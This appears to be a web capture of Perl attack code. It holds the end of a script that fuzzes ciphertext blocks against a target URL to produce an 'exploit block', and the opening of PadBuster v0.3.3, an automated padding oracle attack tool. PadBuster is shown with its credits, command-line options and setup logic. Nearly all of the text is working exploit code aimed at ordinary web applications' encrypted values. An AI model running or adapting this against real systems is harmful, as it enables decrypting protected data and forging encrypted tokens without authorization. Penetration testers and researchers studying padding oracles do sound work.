<span class="kw1">my</span> <span class="re0">$counter</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="co1"># Use random bytes</span>
<span class="kw1">my</span> <span class="re0">@nums</span> <span class="sy0">=</span> <span class="br0">(</span><span class="nu0">0</span><span class="sy0">..</span><span class="nu0">255</span><span class="br0">)</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$status</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="kw1">while</span> <span class="br0">(</span><span class="re0">$status</span><span class="br0">)</span>
  <span class="br0">{</span>
   <span class="co1"># Fuzz the test bytes</span>
   <span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$byteNum</span> <span class="sy0">=</span> <span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span> <span class="re0">$byteNum</span> <span class="sy0">&gt;=</span> <span class="nu0">0</span><span class="sy0">;</span> <span class="re0">$byteNum</span><span class="sy0">--</span><span class="br0">)</span>
   <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$byteNum</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$nums</span><span class="br0">[</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/rand.html"><span class="kw3">rand</span></a><span class="br0">(</span><span class="re0">@nums</span><span class="br0">)</span><span class="br0">]</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
                  <span class="br0">}</span>     
&nbsp;
                   <span class="co1"># Combine the test bytes and the sample</span>
   <span class="kw1">my</span> <span class="re0">$combinedTestBytes</span> <span class="sy0">=</span> encoder<span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">.</span><span class="re0">$sampleBytes</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chomp.html"><span class="kw3">chomp</span></a><span class="br0">(</span><span class="re0">$combinedTestBytes</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="re0">$combinedTestBytes</span> <span class="sy0">=~</span> <span class="co2">s/\%0A//g</span><span class="sy0">;</span>
   <span class="co1"># Ok, now make the request</span>
   <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span> <span class="sy0">=</span> makeRequest<span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$testUrl</span><span class="sy0">.</span><span class="re0">$combinedTestBytes</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$status</span> <span class="sy0">==</span> <span class="st0">"200"</span><span class="br0">)</span>
   <span class="br0">{</span>
   <span class="co1"># Remove this for "T" exploit</span>
   <span class="kw1">if</span> <span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/index.html"><span class="kw3">index</span></a><span class="br0">(</span><span class="re0">$content</span><span class="sy0">,</span><span class="st0">"parent<span class="es0">\.</span>Sys<span class="es0">\.</span>Application"</span><span class="br0">)</span> <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">)</span>
   <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="re0">$content</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span><span class="es0">\n</span>"</span><span class="sy0">;</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"Total Requests:"</span><span class="sy0">.</span><span class="re0">$counter</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span><span class="es0">\n</span>"</span><span class="sy0">;</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"Resulting Exploit Block:"</span><span class="sy0">.</span><span class="re0">$combinedTestBytes</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span><span class="es0">\n</span>"</span><span class="sy0">;</span>
   <span class="kw1">last</span><span class="sy0">;</span>
   <span class="br0">}</span>
   <span class="br0">}</span>
   <span class="re0">$counter</span><span class="sy0">++;</span>
   <span class="br0">}</span>
<span class="co1"># The following code is taken from PadBuster. Credit: Brian Holyfield - Gotham Digital Science</span>
<span class="co1">#</span>
<span class="co1"># I also did the encoder / decoder, but your logic is definitely better</span>
<span class="kw2">sub</span> encoder
<span class="br0">{</span>
<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="sy0">,</span> <span class="re0">$oper</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="co1"># UrlDecoder Encoder</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oper</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span>
   <span class="br0">{</span>
<span class="re0">$toEncodeDecode</span> <span class="sy0">=~</span> <span class="co2">s/\-/\+/g</span><span class="sy0">;</span>
<span class="re0">$toEncodeDecode</span> <span class="sy0">=~</span> <span class="co2">s/\_/\//g</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$count</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chop.html"><span class="kw3">chop</span></a><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">$toEncodeDecode</span> <span class="sy0">=</span> <span class="re0">$toEncodeDecode</span><span class="sy0">.</span><span class="br0">(</span><span class="st0">"="</span> x <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><span class="re0">$count</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">$returnVal</span> <span class="sy0">=</span> decode_base64<span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="br0">}</span>
   <span class="kw1">else</span>
   <span class="br0">{</span>
<span class="re0">$b64Encoded</span> <span class="sy0">=</span> encode_base64<span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">$b64Encoded</span> <span class="sy0">=~</span> <span class="co2">s/(\r|\n)//g</span><span class="sy0">;</span>
<span class="re0">$b64Encoded</span> <span class="sy0">=~</span> <span class="co2">s/\+/\-/g</span><span class="sy0">;</span>
<span class="re0">$b64Encoded</span> <span class="sy0">=~</span> <span class="co2">s/\//\_/g</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$count</span> <span class="sy0">=</span> <span class="re0">$b64Encoded</span> <span class="sy0">=~</span> <span class="co2">s/\=//g</span><span class="sy0">;</span>
<span class="br0">(</span><span class="re0">$count</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span> <span class="sy0">?</span> <span class="br0">(</span><span class="re0">$count</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">:</span> <span class="st0">""</span><span class="sy0">;</span>
<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">$b64Encoded</span><span class="sy0">.</span><span class="re0">$count</span><span class="sy0">;</span>
   <span class="br0">}</span>
&nbsp;
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$returnVal</span><span class="sy0">;</span>
<span class="br0">}</span>
<span class="kw2">sub</span> makeRequest <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$url</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$lwp</span><span class="sy0">,</span> <span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$req</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span><span class="sy0">;</span>  
&nbsp;
 <span class="co1"># Setup LWP UserAgent</span>
 <span class="re0">$lwp</span> <span class="sy0">=</span> LWP<span class="sy0">::</span><span class="me2">UserAgent</span><span class="sy0">-&gt;</span><span class="kw2">new</span><span class="br0">(</span>env_proxy <span class="sy0">=&gt;</span> <span class="nu0">1</span><span class="sy0">,</span>
                            keep_alive <span class="sy0">=&gt;</span> <span class="nu0">1</span><span class="sy0">,</span>
                            timeout <span class="sy0">=&gt;</span> <span class="nu0">30</span><span class="sy0">,</span>
       requests_redirectable <span class="sy0">=&gt;</span> <span class="br0">[</span><span class="br0">]</span><span class="sy0">,</span>
                            <span class="br0">)</span><span class="sy0">;</span>
&nbsp;
 <span class="re0">$req</span> <span class="sy0">=</span> <span class="kw2">new</span> HTTP<span class="sy0">::</span><span class="me2">Request</span> <span class="re0">$method</span> <span class="sy0">=&gt;</span> <span class="re0">$url</span><span class="sy0">;</span>
&nbsp;
 <span class="kw1">my</span> <span class="re0">$response</span> <span class="sy0">=</span> <span class="re0">$lwp</span><span class="sy0">-&gt;</span><span class="me1">request</span><span class="br0">(</span><span class="re0">$req</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
 <span class="co1"># Extract the required attributes from the response</span>
 <span class="re0">$status</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">status_line</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="nu0">3</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$content</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">content</span><span class="sy0">;</span>
 <span class="co1">#print $content;</span>
 <span class="re0">$location</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span><span class="st0">"Location"</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$location</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span>
 <span class="br0">{</span>
  <span class="re0">$location</span> <span class="sy0">=</span> <span class="st0">"N/A"</span><span class="sy0">;</span>
 <span class="br0">}</span>
 <span class="re0">$contentLength</span> <span class="sy0">=</span> <span class="re0">$response</span><span class="sy0">-&gt;</span><span class="me1">header</span><span class="br0">(</span><span class="st0">"Content-Length"</span><span class="br0">)</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span></pre>

<p>
padBuster.pl
</p>
<pre class="code perl"><span class="co1">#!/usr/bin/perl</span>
<span class="co1">#</span>
<span class="co1"># PadBuster v0.3.3 - Automated script for performing Padding Oracle attacks</span>
<span class="co1"># Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)</span>
<span class="co1">#</span>
<span class="co1"># Credits to J.Rizzo and T.Duong for providing proof of concept web exploit</span>
<span class="co1"># techniques and S.Vaudenay for initial discovery of the attack. Credits also</span>
<span class="co1"># to James M. Martin (research@esptl.com) for sharing proof of concept exploit</span>
<span class="co1"># code for performing various brute force attack techniques, and wireghoul (Eldar </span>
<span class="co1"># Marcussen) for making code quality improvements.  </span>
<span class="co1"># </span>
&nbsp;
<span class="kw2">use</span> LWP<span class="sy0">::</span><span class="me2">UserAgent</span><span class="sy0">;</span>
<span class="kw2">use</span> strict<span class="sy0">;</span>
<span class="kw2">use</span> warnings<span class="sy0">;</span>
<span class="kw2">use</span> Getopt<span class="sy0">::</span><span class="me2">Std</span><span class="sy0">;</span>
<span class="kw2">use</span> MIME<span class="sy0">::</span><span class="me2">Base64</span><span class="sy0">;</span>
<span class="kw2">use</span> URI<span class="sy0">::</span><span class="me2">Escape</span><span class="sy0">;</span>
<span class="kw2">use</span> Getopt<span class="sy0">::</span><span class="me2">Long</span><span class="sy0">;</span>
<span class="kw2">use</span> Time<span class="sy0">::</span><span class="me2">HiRes</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/qw.html"><span class="kw3">qw</span></a><span class="br0">(</span> gettimeofday <span class="br0">)</span><span class="sy0">;</span>
<span class="kw2">use</span> Compress<span class="sy0">::</span><span class="me2">Zlib</span><span class="sy0">;</span>
<span class="kw2">use</span> Crypt<span class="sy0">::</span><span class="me2">SSLeay</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># Set defaults with $variable = value</span>
<span class="kw1">my</span> <span class="re0">$logFiles</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$post</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$encoding</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$headers</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$cookie</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$error</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$prefix</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$intermediaryInput</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$cipherInput</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$plainTextInput</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$encodedPlainTextInput</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$noEncodeOption</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$superVerbose</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$proxy</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$proxyAuth</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$noIv</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$auth</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$resumeBlock</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$interactive</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$bruteForce</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$ignoreContent</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$useBody</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$verbose</span><span class="sy0">;</span>
&nbsp;
GetOptions<span class="br0">(</span> <span class="st0">"log"</span> <span class="sy0">=&gt;</span> <span class="re0">\$logFiles</span><span class="sy0">,</span>
            <span class="st0">"post=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$post</span><span class="sy0">,</span>
            <span class="st0">"encoding=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$encoding</span><span class="sy0">,</span>
            <span class="st0">"headers=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$headers</span><span class="sy0">,</span>
            <span class="st0">"cookies=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$cookie</span><span class="sy0">,</span>
            <span class="st0">"error=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$error</span><span class="sy0">,</span>
            <span class="st0">"prefix=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$prefix</span><span class="sy0">,</span>
            <span class="st0">"intermediate=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$intermediaryInput</span><span class="sy0">,</span>
            <span class="st0">"ciphertext=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$cipherInput</span><span class="sy0">,</span>
            <span class="st0">"plaintext=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$plainTextInput</span><span class="sy0">,</span>
	    <span class="st0">"encodedtext=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$encodedPlainTextInput</span><span class="sy0">,</span>
            <span class="st0">"noencode"</span> <span class="sy0">=&gt;</span> <span class="re0">\$noEncodeOption</span><span class="sy0">,</span>
            <span class="st0">"veryverbose"</span> <span class="sy0">=&gt;</span> <span class="re0">\$superVerbose</span><span class="sy0">,</span>
            <span class="st0">"proxy=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$proxy</span><span class="sy0">,</span>
            <span class="st0">"proxyauth=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$proxyAuth</span><span class="sy0">,</span>
            <span class="st0">"noiv"</span> <span class="sy0">=&gt;</span> <span class="re0">\$noIv</span><span class="sy0">,</span>
            <span class="st0">"auth=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$auth</span><span class="sy0">,</span>
            <span class="st0">"resume=s"</span> <span class="sy0">=&gt;</span> <span class="re0">\$resumeBlock</span><span class="sy0">,</span>
            <span class="st0">"interactive"</span> <span class="sy0">=&gt;</span> <span class="re0">\$interactive</span><span class="sy0">,</span>
            <span class="st0">"bruteforce"</span> <span class="sy0">=&gt;</span> <span class="re0">\$bruteForce</span><span class="sy0">,</span>
            <span class="st0">"ignorecontent"</span> <span class="sy0">=&gt;</span> <span class="re0">\$ignoreContent</span><span class="sy0">,</span>
            <span class="st0">"usebody"</span> <span class="sy0">=&gt;</span> <span class="re0">\$useBody</span><span class="sy0">,</span>
            <span class="st0">"verbose"</span> <span class="sy0">=&gt;</span> <span class="re0">\$verbose</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"<span class="es0">\n</span>+-------------------------------------------+<span class="es0">\n</span>"</span><span class="sy0">;</span>
<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"| PadBuster - v0.3.3                        |<span class="es0">\n</span>"</span><span class="sy0">;</span>
<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"| Brian Holyfield - Gotham Digital Science  |<span class="es0">\n</span>"</span><span class="sy0">;</span>
<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"| labs<span class="es0">\@</span>gdssecurity.com                      |<span class="es0">\n</span>"</span><span class="sy0">;</span>
<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"+-------------------------------------------+<span class="es0">\n</span>"</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$#ARGV</span> <span class="sy0">&lt;</span> <span class="nu0">2</span><span class="br0">)</span> <span class="br0">{</span> 
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/die.html"><span class="kw3">die</span></a> <span class="st0">"    
    Use: padBuster.pl URL EncryptedSample BlockSize [options]
  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to test. Must
                           also be present in the URL, PostData or a Cookie
         BlockSize = The block size being used by the algorithm
Options:
	 -auth [username:password]: HTTP Basic Authentication 
	 -bruteforce: Perform brute force against the first block 
	 -ciphertext [Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)
         -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
         -encoding [0-4]: Encoding Format of Sample (Default 0)
                          0=Base64, 1=Lower HEX, 2=Upper HEX
                          3=.NET UrlToken, 4=WebSafe Base64
         -encodedtext [Encoded String]: Data to Encrypt (Encoded)
         -error [Error String]: Padding Error Message
         -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
	 -interactive: Prompt for confirmation on decrypted bytes
	 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
	 -log: Generate log files (creates folder PadBuster.DDMMYY)
	 -noencode: Do not URL-encode the payload (encoded by default)
	 -noiv: Sample does not include IV (decrypt first block) 
         -plaintext [String]: Plain-Text to Encrypt
         -post [Post Data]: HTTP Post Data String
	 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
	 -proxy [address:port]: Use HTTP/S Proxy
	 -proxyauth [username:password]: Proxy Authentication
	 -resume [Block Number]: Resume at this block number
	 -usebody: Use response body content for response analysis phase
         -verbose: Be Verbose
         -veryverbose: Be Very Verbose (Debug Only)
&nbsp;
"</span><span class="sy0">;</span><span class="br0">}</span>
&nbsp;
<span class="co1"># Ok, if we've made it this far we are ready to begin..</span>
<span class="kw1">my</span> <span class="re0">$url</span> <span class="sy0">=</span> <span class="re0">$ARGV</span><span class="br0">[</span><span class="nu0">0</span><span class="br0">]</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$sample</span> <span class="sy0">=</span> <span class="re0">$ARGV</span><span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$blockSize</span> <span class="sy0">=</span> <span class="re0">$ARGV</span><span class="br0">[</span><span class="nu0">2</span><span class="br0">]</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$url</span> <span class="kw1">eq</span> <span class="st0">""</span> <span class="sy0">||</span> <span class="re0">$sample</span> <span class="kw1">eq</span> <span class="st0">""</span> <span class="sy0">||</span> <span class="re0">$blockSize</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span> <span class="br0">{</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"<span class="es0">\n</span>ERROR: The URL, EncryptedSample and BlockSize cannot be null.<span class="es0">\n</span>"</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="co1"># Hard Coded Inputs</span>
<span class="co1">#$post = "";</span>
<span class="co1">#$sample = "";</span>
&nbsp;
<span class="kw1">my</span> <span class="re0">$method</span> <span class="sy0">=</span> <span class="re0">$post</span> <span class="sy0">?</span> <span class="st0">"POST"</span> <span class="sy0">:</span> <span class="st0">"GET"</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># These are file related variables</span>
<span class="kw1">my</span> <span class="re0">$dirName</span> <span class="sy0">=</span> <span class="st0">"PadBuster."</span> <span class="sy0">.</span> <span class="re0">&amp;getTime</span><span class="br0">(</span><span class="st0">"F"</span><span class="br0">)</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$dirSlash</span> <span class="sy0">=</span> <span class="st0">"/"</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$dirCmd</span> <span class="sy0">=</span> <span class="st0">"mkdir "</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/defined.html"><span class="kw3">defined</span></a><span class="br0">(</span><span class="re0">$ENV</span><span class="br0">{</span><span class="st_h">'OS'</span><span class="br0">}</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$ENV</span><span class="br0">{</span>OS<span class="br0">}</span> <span class="sy0">=~</span> <span class="co2">/Windows/</span><span class="br0">)</span> <span class="br0">{</span>
  <span class="re0">$dirSlash</span> <span class="sy0">=</span> <span class="st0">"<span class="es0">\\</span>"</span><span class="sy0">;</span>
  <span class="re0">$dirCmd</span> <span class="sy0">=</span> <span class="st0">"md "</span><span class="sy0">;</span>
 <span class="br0">}</span>
<span class="br0">}</span>
<span class="kw1">my</span> <span class="re0">$dirExists</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$printStats</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$requestTracker</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$timeTracker</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$encoding</span> <span class="sy0">&lt;</span> <span class="nu0">0</span> <span class="sy0">||</span> <span class="re0">$encoding</span> <span class="sy0">&gt;</span> <span class="nu0">4</span><span class="br0">)</span> <span class="br0">{</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"<span class="es0">\n</span>ERROR: Encoding must be a value between 0 and 4<span class="es0">\n</span>"</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span> 
<span class="kw1">my</span> <span class="re0">$encodingFormat</span> <span class="sy0">=</span> <span class="re0">$encoding</span> <span class="sy0">?</span> <span class="re0">$encoding</span> <span class="sy0">:</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">my</span> <span class="re0">$encryptedBytes</span> <span class="sy0">=</span> <span class="re0">$sample</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$totalRequests</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)</span>
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$sample</span> <span class="sy0">=~</span> <span class="co2">/\%/</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="re0">$encryptedBytes</span> <span class="sy0">=</span> <span class="re0">&amp;uri_unescape</span><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="br0">)</span>
<span class="br0">}</span>
&nbsp;
<span class="co1"># Prep the sample for regex use</span>
<span class="re0">$sample</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/quotemeta.html"><span class="kw3">quotemeta</span></a> <span class="re0">$sample</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># Now decode</span>
<span class="re0">$encryptedBytes</span> <span class="sy0">=</span> <span class="re0">&amp;myDecode</span><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="sy0">,</span> <span class="re0">$encodingFormat</span><span class="br0">)</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">(</span> <span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="br0">)</span> <span class="sy0">%</span> <span class="re0">$blockSize</span><span class="br0">)</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"<span class="es0">\n</span>ERROR: Encrypted Bytes must be evenly divisible by Block Size ($blockSize)<span class="es0">\n</span>"</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"       Encrypted sample length is "</span><span class="sy0">.</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">". Double check the Encoding and Block Size.<span class="es0">\n</span>"</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="co1"># If no IV, then append nulls as the IV (only if decrypting)</span>
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$noIv</span> <span class="sy0">&amp;&amp;</span> <span class="sy0">!</span><span class="re0">$bruteForce</span> <span class="sy0">&amp;&amp;</span> <span class="sy0">!</span><span class="re0">$plainTextInput</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="re0">$encryptedBytes</span> <span class="sy0">=</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="re0">$blockSize</span> <span class="sy0">.</span> <span class="re0">$encryptedBytes</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="co1"># PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)</span>
<span class="kw1">my</span> <span class="re0">$plainTextBytes</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># This is a bool to make sure we know where to replace the sample string</span>
<span class="kw1">my</span> <span class="re0">$wasSampleFound</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># ForgedBytes is where the complete forged sample will be stored (encrypt only)</span>
